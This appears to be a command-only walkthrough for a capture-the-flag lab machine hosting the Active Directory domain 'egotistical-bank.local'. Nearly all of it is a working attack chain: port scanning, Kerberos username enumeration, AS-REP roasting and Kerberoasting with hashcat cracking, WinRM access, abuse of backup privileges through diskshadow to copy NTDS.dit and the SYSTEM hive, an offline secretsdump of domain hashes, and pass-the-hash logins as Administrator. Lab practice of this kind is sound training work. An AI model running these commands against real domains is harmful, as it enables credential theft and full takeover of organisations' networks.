```bash
IP=10.10.10.175; DOM=egotistical-bank.local; DC=$IP
```

# Recon

```bash
sudo nmap -p- --min-rate 5000 -T4 -oA scans/alltcp $IP
sudo nmap -sV -sC -p80,88,135,139,389,445,464,593,5985,636,3268,3269 -oA scans/versvc $IP
```

# Usernames from names -> users.txt

# Kerberos username validation

```bash
kerbrute userenum -d $DOM --dc $DC users.txt -o kerbrute_valid.txt
cut -d' ' -f7 kerbrute_valid.txt | sed 's/@.*//' | sort -u > valid_users.txt
```

# AS-REP Roast + crack

```bash
impacket-GetNPUsers $DOM/ -dc-ip $DC -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

# WinRM foothold

```bash
evil-winrm -i $IP -u <asrep_user> -p '<asrep_pass>'
```

# Kerberoast (with any valid user)

```bash
impacket-GetUserSPNs $DOM/<user>:'<pass>' -dc-ip $DC -request -outputfile kerberoast_tgs.txt
hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i $IP -u <svc_user> -p '<svc_pass>'
```

# Check for SeBackupPrivilege on DC

```cmd
whoami /priv
```

# DiskShadow (on target)

```cmd
echo "set context persistent nowriters" > C:\Windows\Temp\ds.txt
echo "add volume C: alias cdrive"      >> C:\Windows\Temp\ds.txt
echo "create"                          >> C:\Windows\Temp\ds.txt
echo "expose %cdrive% Z:"              >> C:\Windows\Temp\ds.txt
diskshadow.exe /s C:\Windows\Temp\ds.txt
copy Z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit
copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
download C:\Windows\Temp\NTDS.dit
download C:\Windows\Temp\SYSTEM
```

# Offline dump + PTH

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL | tee ntds_dump.txt
```

# Grab Administrator NT hash and:

```bash
evil-winrm -i $IP -u Administrator -H <NTLM_HASH>
```

# or:

```bash
impacket-psexec Administrator@$IP -hashes :<NTLM_HASH>
```
